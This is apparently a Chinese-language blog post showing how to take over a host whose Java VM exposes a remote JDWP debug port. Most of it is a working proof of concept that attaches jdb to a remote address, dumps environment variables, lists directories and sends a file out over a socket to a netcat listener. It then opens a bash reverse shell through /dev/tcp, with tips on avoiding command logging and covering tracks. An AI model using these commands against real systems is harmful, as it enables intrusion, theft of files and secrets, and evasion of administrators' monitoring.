---
layout: post
title: "jdb getshell"
date: 2018-02-25 20:54:47 +800
categories: 
by: gf
description: 通过 jdb 得到主机权限
---
jdb 是 Java 的调试工具，类似 lldb 或者 gdb，不过感觉确实比 lldb 弱一些，但是好歹是支持 eval 的。所以如果一个远程的 jvm 开启了远程 debug，比如加了启动参数：

```
-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=8000
```

那我们可以连接这个远程端口，并且很容易 getshell。

POC：

```bash
# 本地连接远程 jvm
jdb -attach 11.160.195.235:8000
# 看一下有哪些进程
threads
# 随便挂起一个
thread 0x4af8
suspend 0x4af8
step
# 稍等一下就可以看到断点信息
# 随便练练手
print new java.lang.String("Hello")
print java.lang.System.getenv()
print java.lang.System.getProperties()

# 列出某目录下的文件 
print  java.util.Arrays.toString(new java.io.File("/home/admin/").list())
#查看某个文件的大小
print new java.io.File("/home/admin/elephant/target/elephant.tgz").length()
# 把某个文件发送到远程
# 需要开启远程机器的某个端口，比如在我本机(10.65.158.130)运行 nc -lv 8000 > file
print (new java.net.Socket ("10.65.158.130",8000)).getOutputStream().write(java.nio.file.Files.readAllBytes(new java.io.File("/home/admin/elephant/target/elephant.tgz").toPath()));

# 终极大招，反弹 shell
# 不过 bash 这个应用一般都会被管理员加各种 log，所以最好不要这样运行命令，很容易被拆穿。
# 在我本机运行 nc -lv 8000
java.lang.Runtime.getRuntime().exec("/bin/bash,-c,exec 5<>/dev/tcp/10.65.158.130/8000;cat <&5 | while read line; do $line 2>&5 >&5; done".split(",")).waitFor();
# 这时候就可以在我本机运行各种 shell 命令了。

# 最后记得擦屁股，
resume
exit
```


话又说回来，jdb getshell 干什么用呢？貌似除了自宫没任何意义，毕竟没有人会在线上环境开启远程 debug，而且还是公网可访问的。

所以仅供娱乐吧。
